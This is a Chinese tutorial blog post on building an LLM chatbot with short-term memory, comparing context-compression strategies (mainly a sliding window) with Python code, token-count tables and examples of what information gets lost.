<p>完整代码见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Fsrc%2Fmemory%2Fshort_term.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/src/memory/short_term.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h3 data-id="heading-17"><strong>2.4 集成到Chatbot</strong></h3>
<p>有了短期记忆，如何集成到Chatbot中？核心流程是：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryChatbot</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, system_prompt: <span class="hljs-built_in">str</span> = <span class="hljs-string">"你是AI助手"</span></span>):
        self.llm = llm
        self.system_prompt = system_prompt
        self.memory = ShortTermMemory(max_turns=<span class="hljs-number">10</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">self, user_input: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-comment"># 1. 保存用户输入到记忆</span>
        self.memory.add_message(<span class="hljs-string">"user"</span>, user_input)
        
        <span class="hljs-comment"># 2. 构建上下文：system + 历史消息</span>
        messages = [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: self.system_prompt}
        ]
        messages.extend(self.memory.get_messages())
        
        <span class="hljs-comment"># 3. 调用LLM</span>
        response = self.llm.chat(messages)
        
        <span class="hljs-comment"># 4. 保存AI回复到记忆</span>
        self.memory.add_message(<span class="hljs-string">"assistant"</span>, response)
        
        <span class="hljs-keyword">return</span> response
</code></pre>
<p><strong>数据流：</strong></p>
<pre><code class="hljs language-sql" lang="sql">用户输入 "我叫Tom"
    ↓
存入memory: [{"role": "user", "content": "我叫Tom"}]
    ↓
构建上下文: [<span class="hljs-keyword">system</span>, <span class="hljs-keyword">user</span>消息]
    ↓
调用LLM → 返回 "你好Tom！"
    ↓
存入memory: [<span class="hljs-keyword">user</span>消息, assistant消息]
</code></pre>
<p><strong>效果演示：</strong></p>
<pre><code class="hljs language-python" lang="python">bot = MemoryChatbot(llm)

<span class="hljs-comment"># 第1轮</span>
bot.chat(<span class="hljs-string">"我叫Tom"</span>)
<span class="hljs-comment"># Bot: "你好Tom！"</span>

<span class="hljs-comment"># 第2轮</span>
bot.chat(<span class="hljs-string">"我在上海工作"</span>)
<span class="hljs-comment"># Bot: "上海是个很棒的城市！"</span>

<span class="hljs-comment"># 第3轮 - 测试记忆</span>
bot.chat(<span class="hljs-string">"我叫什么名字？在哪工作？"</span>)
<span class="hljs-comment"># Bot: "你叫Tom，在上海工作" ✅ 记住了！</span>
</code></pre>
<p>完整代码见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Fsrc%2Fchatbot.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/src/chatbot.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h3 data-id="heading-18"><strong>2.5 短期记忆的局限性</strong></h3>
<p>短期记忆虽然简单高效，但有三个明显的问题：</p>
<h4 data-id="heading-19"><strong>问题1：容量有限</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 设置最多保存10轮</span>
memory = ShortTermMemory(max_turns=<span class="hljs-number">10</span>)

<span class="hljs-comment"># 对话20轮后</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):
    memory.add_message(<span class="hljs-string">"user"</span>, <span class="hljs-string">f"消息<span class="hljs-subst">{i}</span>"</span>)
    memory.add_message(<span class="hljs-string">"assistant"</span>, <span class="hljs-string">f"回复<span class="hljs-subst">{i}</span>"</span>)

<span class="hljs-comment"># 结果：前10轮被丢弃</span>
<span class="hljs-built_in">print</span>(memory.get_turn_count())  <span class="hljs-comment"># 10轮</span>
<span class="hljs-comment"># 第1轮的"我叫Tom"已经找不到了！❌</span>
</code></pre>
<h4 data-id="heading-20"><strong>问题2：简单粗暴的删除策略</strong></h4>
<pre><code class="hljs language-python" lang="python">重要信息：<span class="hljs-string">"我叫Tom"</span>（第<span class="hljs-number">1</span>轮）
不重要信息：<span class="hljs-string">"谢谢"</span>（第<span class="hljs-number">19</span>轮）

<span class="hljs-number">10</span>轮后，<span class="hljs-string">"我叫Tom"</span>被删除
但<span class="hljs-string">"谢谢"</span>被保留

这不合理！❌
</code></pre>
<p>短期记忆<strong>不区分信息的重要性</strong>，只按时间顺序删除。</p>
<h4 data-id="heading-21"><strong>问题3：Token浪费</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-number">20</span>轮对话 = <span class="hljs-number">20</span>条消息 ≈ <span class="hljs-number">8000</span> tokens

其中可能包含：
- <span class="hljs-string">"嗯"</span>、<span class="hljs-string">"好的"</span>、<span class="hljs-string">"谢谢"</span> 等无意义内容
- 重复的信息
- 可以压缩的冗长描述

这些都占用宝贵的上下文窗口！
</code></pre>
<p>短期记忆解决了<strong>基本的记忆能力</strong>，但三个局限性告诉我们：</p>
<p><strong>我们需要更智能的策略：</strong></p>
<ol>
<li>在有限空间内保存<strong>更多信息</strong></li>
<li>保留<strong>重要内容</strong>，删除<strong>无关内容</strong></li>
<li><strong>压缩冗长对话</strong>，节省token</li>
</ol>
<p>好的！让我们写 <strong>3.1 为什么需要压缩？</strong> 🗜️</p>
<hr/>
<h2 data-id="heading-22"><strong>三、4种压缩策略详解</strong></h2>
<h3 data-id="heading-23"><strong>3.1 为什么需要压缩？</strong></h3>
<p>在第二章我们看到，短期记忆有三个致命问题：</p>
<ol>
<li>容量固定，重要信息会丢失</li>
<li>不区分信息重要性</li>
<li>Token浪费严重</li>
</ol>
<p>现在问题来了：<strong>如何在有限的空间内，保存更多有价值的信息？</strong></p>
<p>答案是：<strong>压缩</strong>。</p>
<h4 data-id="heading-24"><strong>压缩要解决的核心矛盾</strong></h4>
<pre><code class="hljs language-diff" lang="diff">矛盾：
<span class="hljs-deletion">- LLM上下文窗口有限（如8K tokens）</span>
<span class="hljs-deletion">- 用户对话可能很长（50轮、100轮...）</span>
<span class="hljs-deletion">- 每个token都要花钱</span>

目标：
<span class="hljs-deletion">- 用更少的token</span>
<span class="hljs-deletion">- 保留更多的信息</span>
<span class="hljs-deletion">- 保持对话连贯性</span>
</code></pre>
<h4 data-id="heading-25"><strong>一个具体的例子</strong></h4>
<p>假设我们有这样一段对话历史（10轮，20条消息）：</p>
<pre><code class="hljs language-python" lang="python">原始对话（未压缩）：
[
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我叫Tom"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你好Tom！很高兴认识你。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我在上海工作"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"上海是个很国际化的城市！你在哪个行业？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我是AI工程师"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"AI工程师是个很有前景的职业！"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我最近在研究Agent"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Agent是很前沿的方向！"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"遇到了通信延迟问题"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"通信延迟可以考虑优化消息队列。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"用什么消息队列？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"可以考虑Redis或RabbitMQ。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis性能怎么样？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis非常快，单机QPS可达10万+。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"好的，谢谢"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"不客气！有问题随时问。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"嗯"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"还有什么我能帮你的吗？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"没有了"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"好的，祝你工作顺利！"</span>}
]

统计：
- <span class="hljs-number">20</span>条消息
- 约<span class="hljs-number">2000</span> tokens
- 包含重要信息：<span class="hljs-string">"Tom"</span>、<span class="hljs-string">"上海"</span>、<span class="hljs-string">"AI工程师"</span>、<span class="hljs-string">"Agent"</span>、<span class="hljs-string">"Redis"</span>
- 也包含冗余信息：<span class="hljs-string">"好的谢谢"</span>、<span class="hljs-string">"嗯"</span>、<span class="hljs-string">"没有了"</span>
</code></pre>
<p><strong>压缩后应该是什么样？</strong></p>
<p>理想的压缩结果：</p>
<pre><code class="hljs language-python" lang="python">压缩后：
[
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"用户Tom，上海AI工程师，研究Agent，遇到通信延迟，推荐用Redis"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis性能怎么样？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis非常快，单机QPS可达10万+。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"没有了"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"好的，祝你工作顺利！"</span>}
]

统计：
- <span class="hljs-number">5</span>条消息
- 约<span class="hljs-number">500</span> tokens
- 保留了所有关键信息
- 删除了冗余内容
- 压缩率：<span class="hljs-number">75</span>% ✅
</code></pre>
<h4 data-id="heading-26"><strong>如何评价一个压缩策略？</strong></h4>
<p>我们需要从4个维度来评价：</p>
<p><strong>1. 压缩率（Compression Rate）</strong></p>
<pre><code class="hljs language-diff" lang="diff">压缩率 = (原始tokens - 压缩后tokens) / 原始tokens

例如：
<span class="hljs-deletion">- 原始：2000 tokens</span>
<span class="hljs-deletion">- 压缩后：500 tokens</span>
<span class="hljs-deletion">- 压缩率：75%</span>

越高越好 ✅
</code></pre>
<p><strong>2. 速度（Speed）</strong></p>
<pre><code class="hljs language-diff" lang="diff">压缩耗时

例如：
<span class="hljs-deletion">- 滑动窗口：&lt;1ms（内存操作）</span>
<span class="hljs-deletion">- LLM摘要：1-3秒（需要API调用）</span>

越快越好 ✅
</code></pre>
<p><strong>3. 成本（Cost）</strong></p>
<pre><code class="hljs language-bash" lang="bash">压缩本身的成本

例如：
- 滑动窗口：<span class="hljs-variable">$0</span>（无额外成本）
- LLM摘要：<span class="hljs-variable">$0</span>.0001（需要调用LLM）

越低越好 ✅
</code></pre>
<p><strong>4. 语义保留（Semantic Preservation）</strong></p>
<pre><code class="hljs language-diff" lang="diff">是否保留了重要信息？

例如：
<span class="hljs-deletion">- 滑动窗口：可能丢失早期的重要信息 ⚠️</span>
<span class="hljs-deletion">- LLM摘要：智能提取关键信息 ✅</span>

越好越好 ✅
</code></pre>
<h4 data-id="heading-27"><strong>压缩策略的权衡（Trade-off）</strong></h4>
<p>现实中，我们无法同时优化所有4个维度：</p>
<pre><code class="hljs language-lua" lang="lua">不可能三角：
       速度快
        / \
       /   \
      /     \
   成本低 <span class="hljs-comment">---- 语义好</span>

你只能选两个！
</code></pre>
<p><strong>例如：</strong></p>
<ul>
<li><strong>滑动窗口</strong>：速度快 + 成本低 = 语义差</li>
<li><strong>LLM摘要</strong>：语义好 + 压缩率高 = 速度慢、成本高</li>
<li><strong>混合策略</strong>：尝试平衡三者</li>
</ul>
<h4 data-id="heading-28"><strong>我们要实现的4种策略</strong></h4>
<p>基于不同的权衡，我们实现4种压缩策略：</p>



































<table><thead><tr><th>策略</th><th>核心思路</th><th>优势维度</th><th>劣势维度</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>只保留最近N轮</td><td>速度、成本</td><td>语义保留</td></tr><tr><td><strong>LLM摘要</strong></td><td>用LLM总结历史</td><td>语义保留</td><td>速度、成本</td></tr><tr><td><strong>混合策略</strong></td><td>自适应选择</td><td>平衡</td><td>复杂度</td></tr><tr><td><strong>Token动态</strong></td><td>精确控制token数</td><td>精确度</td><td>语义保留</td></tr></tbody></table>
<p>接下来，我们逐个详解这4种策略的：</p>
<ul>
<li>核心原理</li>
<li>代码实现</li>
<li>性能表现</li>
<li>适用场景</li>
</ul>
<p>好的！让我们写 <strong>3.2 策略1：滑动窗口</strong> 🪟</p>
<hr/>
<h4 data-id="heading-29"/>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowCompressor</span>:
    <span class="hljs-string">"""
    滑动窗口压缩器
    
    原理：只保留最近N轮对话
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, keep_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>):
        <span class="hljs-string">"""
        Args:
            keep_turns: 保留最近几轮对话
        """</span>
        self.keep_turns = keep_turns
        self.keep_messages = keep_turns * <span class="hljs-number">2</span>  <span class="hljs-comment"># 1轮 = 2条消息</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩消息列表
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 如果消息数未超过限制，直接返回</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &lt;= self.keep_messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 只保留最后N条消息</span>
        compressed = messages[-self.keep_messages:]
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>使用示例：</strong></p>
<pre><code class="hljs language-python" lang="python">compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">3</span>)

<span class="hljs-comment"># 原始对话（10条消息，5轮）</span>
messages = [
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我叫Tom"</span>},           <span class="hljs-comment"># 第1轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你好Tom！"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我在上海"</span>},          <span class="hljs-comment"># 第2轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"上海不错"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我是工程师"</span>},        <span class="hljs-comment"># 第3轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"很好"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我研究AI"</span>},          <span class="hljs-comment"># 第4轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"AI很热"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"推荐书籍"</span>},          <span class="hljs-comment"># 第5轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"推荐xxx"</span>},
]

<span class="hljs-comment"># 压缩：只保留最近3轮</span>
compressed = compressor.compress(messages)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"原始：<span class="hljs-subst">{<span class="hljs-built_in">len</span>(messages)}</span>条消息"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"压缩后：<span class="hljs-subst">{<span class="hljs-built_in">len</span>(compressed)}</span>条消息"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"保留的是第3-5轮"</span>)
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 原始：10条消息</span>
<span class="hljs-comment"># 压缩后：6条消息</span>
<span class="hljs-comment"># 保留的是第3-5轮</span>
</code></pre>
<h4 data-id="heading-30"><strong>工作原理可视化</strong></h4>
<pre><code class="hljs language-python" lang="python">原始对话（<span class="hljs-number">20</span>条消息，<span class="hljs-number">10</span>轮）：

轮数:  <span class="hljs-number">1</span>      <span class="hljs-number">2</span>      <span class="hljs-number">3</span>      <span class="hljs-number">4</span>      <span class="hljs-number">5</span>      <span class="hljs-number">6</span>      <span class="hljs-number">7</span>      <span class="hljs-number">8</span>      <span class="hljs-number">9</span>      <span class="hljs-number">10</span>
      [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a]
       ↓                                                    ↓
     丢弃前<span class="hljs-number">7</span>轮                                          保留后<span class="hljs-number">3</span>轮

压缩后（<span class="hljs-number">6</span>条消息，<span class="hljs-number">3</span>轮）：

轮数:                                                  <span class="hljs-number">8</span>      <span class="hljs-number">9</span>      <span class="hljs-number">10</span>
                                                     [u,a] [u,a] [u,a]
</code></pre>
<h4 data-id="heading-31"><strong>性能分析</strong></h4>
<p>好的！让我们先更新 <strong>3.2 滑动窗口</strong> 的数据部分 📝</p>
<p>好的！让我完全重写 <strong>3.2 滑动窗口策略</strong>，整合所有真实数据 📝</p>
<hr/>
<h3 data-id="heading-32"><strong>3.2 策略1：滑动窗口（Sliding Window）</strong></h3>
<h4 data-id="heading-33"><strong>核心原理</strong></h4>
<p>滑动窗口是最简单直接的压缩策略：<strong>只保留最近的N轮对话，丢弃更早的消息。</strong></p>
<p>就像一个固定大小的"窗口"在对话历史上滑动：</p>
<pre><code class="hljs language-markdown" lang="markdown">完整对话历史（10轮，20条消息）：
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 1  │ 2  │ 3  │ 4  │ 5  │ 6  │ 7  │ 8  │ 9  │ 10 │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘

保留最近5轮（窗口大小=5）：
<span class="hljs-code">                              ┌────┬────┬────┬────┬────┐
│ 6  │ 7  │ 8  │ 9  │ 10 │     └────┴────┴────┴────┴────┘
             ↑
          滑动窗口
</span></code></pre>
<p><strong>工作方式：</strong></p>
<ol>
<li>设定窗口大小（如5轮 = 10条消息）</li>
<li>当消息超过窗口大小时</li>
<li>自动删除最早的消息</li>
<li>保持窗口内的消息数量固定</li>
</ol>
<h4 data-id="heading-34"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowCompressor</span>:
    <span class="hljs-string">"""
    滑动窗口压缩器
    
    特点：
    - 极简实现（3行核心代码）
    - 极快速度（0.14微秒/次）
    - 零成本（无需API调用）
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, keep_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>):
        <span class="hljs-string">"""
        Args:
            keep_turns: 保留最近几轮对话
        """</span>
        self.keep_turns = keep_turns
        self.keep_messages = keep_turns * <span class="hljs-number">2</span>  <span class="hljs-comment"># 1轮 = user + assistant</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩消息列表
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 核心逻辑就这一行！</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &lt;= self.keep_messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-keyword">return</span> messages[-self.keep_messages:]
</code></pre>
<p><strong>就这么简单！</strong> 核心代码只有一行：<code>messages[-self.keep_messages:]</code></p>
<h4 data-id="heading-35"><strong>真实性能测试</strong></h4>
<p>我们对滑动窗口进行了5项完整测试，以下是真实数据：</p>
<hr/>
<p><strong>测试1：压缩率测试</strong></p>
<p>窗口大小设置为5轮，测试不同长度的对话：</p>



































<table><thead><tr><th>对话长度</th><th>原始</th><th>压缩后</th><th>Token压缩率</th></tr></thead><tbody><tr><td>5轮（短对话）</td><td>10条 / 126 tokens</td><td>10条 / 126 tokens</td><td><strong>0%</strong></td></tr><tr><td>10轮（中等）</td><td>20条 / 249 tokens</td><td>10条 / 123 tokens</td><td><strong>50.6%</strong></td></tr><tr><td>20轮（长对话）</td><td>42条 / 560 tokens</td><td>10条 / 145 tokens</td><td><strong>74.1%</strong></td></tr><tr><td>30轮（超长）</td><td>68条 / 933 tokens</td><td>10条 / 144 tokens</td><td><strong>84.6%</strong></td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">压缩率随对话长度增加：
<span class="hljs-deletion">- 5轮: 0% (不压缩)</span>
<span class="hljs-deletion">- 10轮: 50% (压缩一半)</span>
<span class="hljs-deletion">- 20轮: 74% (压缩3/4)</span>
<span class="hljs-deletion">- 30轮: 85% (压缩85%)</span>

结论：对话越长，滑动窗口越有效 ✅
</code></pre>
<hr/>
<p><strong>测试2：速度测试</strong></p>
<p>测试10万次压缩操作的耗时：</p>
<pre><code class="hljs language-diff" lang="diff">操作次数: 100,000次
总耗时: 13.63ms
平均每次: 0.14微秒 ⚡

直观对比：
<span class="hljs-deletion">- 人眨眼一次: 100,000微秒</span>
<span class="hljs-deletion">- 在眨眼时间内，滑动窗口可以执行 714,285次</span>
<span class="hljs-deletion">- 一次HTTP请求(50ms)内，可以执行 357,142次</span>
</code></pre>
<p><strong>结论：速度快到可以忽略不计。</strong></p>
<hr/>
<p><strong>测试3：信息丢失分析（关键测试！）</strong></p>
<p>构造一个包含重要用户信息的8轮对话，使用5轮窗口压缩：</p>
<pre><code class="hljs language-python" lang="python">原始对话（<span class="hljs-number">8</span>轮，<span class="hljs-number">16</span>条消息）:
  轮<span class="hljs-number">1</span> 用户: <span class="hljs-string">"我叫Tom，今年28岁"</span>          ← 重要！
      助手: <span class="hljs-string">"你好Tom！"</span>
  轮<span class="hljs-number">2</span> 用户: <span class="hljs-string">"我在上海浦东工作"</span>           ← 重要！
      助手: <span class="hljs-string">"浦东是金融中心"</span>
  轮<span class="hljs-number">3</span> 用户: <span class="hljs-string">"我是AI工程师"</span>               ← 重要！
      助手: <span class="hljs-string">"很有前景的职业"</span>
  轮<span class="hljs-number">4</span> 用户: <span class="hljs-string">"我在研究Agent技术"</span>          ← 重要！
      助手: <span class="hljs-string">"Agent很前沿"</span>
  轮<span class="hljs-number">5</span> 用户: <span class="hljs-string">"嗯"</span>                         ← 无用
      助手: <span class="hljs-string">"还有什么问题吗？"</span>
  轮<span class="hljs-number">6</span> 用户: <span class="hljs-string">"好的"</span>                       ← 无用
      助手: <span class="hljs-string">"随时问我"</span>
  轮<span class="hljs-number">7</span> 用户: <span class="hljs-string">"谢谢"</span>                       ← 无用
      助手: <span class="hljs-string">"不客气"</span>
  轮<span class="hljs-number">8</span> 用户: <span class="hljs-string">"那我研究一下"</span>
      助手: <span class="hljs-string">"好的，加油"</span>

压缩后（保留<span class="hljs-number">5</span>轮 = <span class="hljs-number">10</span>条消息）:
  ✅ 轮<span class="hljs-number">4</span>: <span class="hljs-string">"我在研究Agent技术"</span>
  ✅ 轮<span class="hljs-number">5</span>: <span class="hljs-string">"嗯"</span>
  ✅ 轮<span class="hljs-number">6</span>: <span class="hljs-string">"好的"</span>
  ✅ 轮<span class="hljs-number">7</span>: <span class="hljs-string">"谢谢"</span>
  ✅ 轮<span class="hljs-number">8</span>: <span class="hljs-string">"那我研究一下"</span>

被丢弃的内容（前<span class="hljs-number">3</span>轮 = <span class="hljs-number">6</span>条消息）:
  ❌ <span class="hljs-string">"我叫Tom，今年28岁"</span>        ⚠️ 重要信息！
  ❌ <span class="hljs-string">"你好Tom！"</span>                 ⚠️ 包含姓名
  ❌ <span class="hljs-string">"我在上海浦东工作"</span>          ⚠️ 重要信息！
  ❌ <span class="hljs-string">"浦东是金融中心"</span>
  ❌ <span class="hljs-string">"我是AI工程师"</span>             ⚠️ 重要信息！
  ❌ <span class="hljs-string">"很有前景的职业"</span>
</code></pre>
<p><strong>问题一目了然：</strong></p>
<ul>
<li>所有用户背景信息（姓名、地点、职业）全部丢失</li>
<li>保留的却是"嗯"、"好的"、"谢谢"这些无意义内容</li>
</ul>
<p><strong>这就是滑动窗口的致命缺陷！</strong> 它不会思考什么重要，只会机械地按时间删除。</p>
<hr/>
<p><strong>测试4：真实Chatbot场景</strong></p>
<p>模拟一个15轮连续对话，观察关键信息的丢失过程：</p>
<pre><code class="hljs language-makefile" lang="makefile">初始关键信息：
- 姓名: <span class="hljs-string">"Tom"</span>
- 地点: <span class="hljs-string">"上海"</span>
- 职业: <span class="hljs-string">"AI工程师"</span>
- 研究方向: <span class="hljs-string">"Agent"</span>

<span class="hljs-section">第5轮后:</span>
  记忆: 10条消息（5轮）
  压缩: 10条 → 10条（未超过限制）
  关键词: ✅ Tom、上海、AI工程师、Agent 全部保留

<span class="hljs-section">第10轮后:</span>
  记忆: 20条消息（10轮）
  压缩: 20条 → 10条（删除前5轮）
  关键词: ❌ Tom、上海、AI工程师、Agent 全部丢失

<span class="hljs-section">第15轮后:</span>
  记忆: 20条消息（10轮，因为短期记忆限制）
  压缩: 20条 → 10条
  关键词: ❌ 仍然全部丢失
</code></pre>
<p><strong>结论：超过10轮后，早期的所有关键信息永久丢失。</strong></p>
<hr/>
<p><strong>测试5：不同窗口大小的权衡</strong></p>
<p>在同一个20轮对话（560 tokens）中测试不同窗口大小：</p>









































<table><thead><tr><th>窗口大小</th><th>保留消息</th><th>压缩后Tokens</th><th>Token压缩率</th></tr></thead><tbody><tr><td>3轮</td><td>6条</td><td>86</td><td><strong>84.6%</strong> ⭐</td></tr><tr><td>5轮</td><td>10条</td><td>145</td><td><strong>74.1%</strong></td></tr><tr><td>8轮</td><td>16条</td><td>227</td><td><strong>59.5%</strong></td></tr><tr><td>10轮</td><td>20条</td><td>287</td><td><strong>48.8%</strong></td></tr><tr><td>15轮</td><td>30条</td><td>408</td><td><strong>27.1%</strong></td></tr></tbody></table>
<p><strong>权衡分析：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">窗口太小（3轮）:</span>
✅ 压缩率高（85%）
❌ 信息丢失严重
❌ 对话连贯性差

<span class="hljs-section">窗口适中（5-8轮）:</span>
✅ 压缩率好（60-75%）
⚠️ 信息丢失中等
✅ 对话基本连贯

<span class="hljs-section">窗口太大（15轮）:</span>
❌ 压缩率低（27%）
✅ 信息保留好
✅ 对话连贯
</code></pre>
